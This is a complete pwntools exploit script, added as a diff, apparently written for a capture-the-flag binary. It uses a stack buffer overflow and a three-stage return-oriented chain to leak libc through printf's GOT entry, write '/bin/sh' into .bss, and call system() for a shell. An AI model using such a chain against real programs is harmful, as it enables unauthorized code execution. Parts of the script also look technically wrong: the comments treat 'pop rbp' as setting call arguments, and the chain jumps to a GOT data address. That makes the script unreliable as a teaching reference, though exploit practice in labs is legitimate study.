@@ -1,0 +1,67 @@
+#!/Users/vinnie/CTF/venv/bin/python3
+from pwn import *
+
+# Load binary and libc
+binary = ELF("./chall")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.binary = binary
+context.log_level = "debug"
+
+# Start process
+p = process("./chall")
+
+# Gadgets
+ret_gadget = 0x40101a   # ret (for stack alignment)
+pop_rbp = 0x40115d      # pop rbp; ret
+
+# GOT/PLT Addresses
+printf_got = binary.got["printf"]
+printf_plt = binary.plt["printf"]
+scanf_got = binary.got["__isoc99_scanf"]
+bss_addr = 0x404060  # Writable address
+
+# 1️⃣ Leak libc address
+payload = b"A" * 264
+payload += p64(pop_rbp)    # pop rbp; ret
+payload += p64(printf_got) # rbp <- printf@GOT
+payload += p64(ret_gadget) # Align stack for IBT
+payload += p64(printf_plt) # Call printf(printf@GOT)
+payload += p64(binary.symbols["vuln"])  # Restart vuln()
+
+p.sendline(payload)
+
+# Receive leaked address
+p.recvuntil("Goodbye!\n")
+leaked_printf = u64(p.recvline().strip().ljust(8, b"\x00"))
+
+# Compute libc base
+libc_base = leaked_printf - libc.symbols["printf"]
+system = libc_base + libc.symbols["system"]
+
+log.info(f"Leaked printf: {hex(leaked_printf)}")
+log.info(f"Libc base: {hex(libc_base)}")
+log.info(f"System: {hex(system)}")
+
+# 2️⃣ Write "/bin/sh" to .bss
+payload = b"A" * 264
+payload += p64(pop_rbp)   # pop rbp; ret
+payload += p64(bss_addr)  # rbp <- writable memory
+payload += p64(ret_gadget)  # Align for IBT
+payload += p64(scanf_got)  # Call scanf("%s", bss_addr)
+payload += p64(binary.symbols["vuln"])  # Restart vuln()
+
+p.sendline(payload)
+p.sendline(b"/bin/sh\x00")  # Send string for scanf
+
+# 3️⃣ Call system("/bin/sh")
+payload = b"A" * 264
+payload += p64(ret_gadget)  # Align stack
+payload += p64(pop_rbp)  # pop rbp; ret
+payload += p64(bss_addr)  # rbp <- "/bin/sh" address
+payload += p64(ret_gadget)  # Align
+payload += p64(system)  # Call system("/bin/sh")
+
+p.sendline(payload)
+p.interactive()  # Enjoy the shell!
